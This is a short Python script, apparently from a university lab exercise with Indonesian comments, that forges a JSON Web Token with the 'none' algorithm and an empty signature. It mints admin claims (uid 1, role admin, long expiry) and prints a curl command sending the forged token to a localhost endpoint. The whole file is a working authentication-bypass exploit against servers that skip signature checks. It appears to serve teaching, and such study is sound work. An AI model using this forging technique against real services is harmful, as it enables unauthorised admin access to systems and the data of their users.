#!/usr/bin/env python3
# ============================================================
# LAB BAC #3 - T1: forge token JWT alg="none" (Tugas Kuliah) — kikikokok
# Demo: header {"alg":"none"} -> server (jwt_decode_flawed) TIDAK
# verifikasi tanda tangan. Token admin palsu jadi valid.
# ============================================================
import argparse
import base64
import json


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def mint(payload: dict) -> str:
    header = {"alg": "none", "typ": "JWT"}
    h = b64url(json.dumps(header, separators=(",", ":")).encode())
    p = b64url(json.dumps(payload, separators=(",", ":")).encode())
    # signature part kosong -> server 'none' tidak memeriksanya
    return f"{h}.{p}."


def main() -> None:
    ap = argparse.ArgumentParser(description="forge JWT alg=none (lab lokal)")
    ap.add_argument("--uid", type=int, default=1, help="uid target (1=admin)")
    ap.add_argument("--role", default="admin")
    ap.add_argument("--username", default="admin")
    ap.add_argument("--cabang", type=int, default=1)
    args = ap.parse_args()

    payload = {
        "uid": args.uid,
        "username": args.username,
        "role": args.role,
        "cabang_id": args.cabang,
        "exp": 2_000_000_000,
    }
    token = mint(payload)
    print(token)
    print()
    print("Contoh pakai:")
    print(f'curl -s http://127.0.0.1:8094/api/auth/me.php \\')
    print(f'  -H "Authorization: Bearer {token}"')


if __name__ == "__main__":
    main()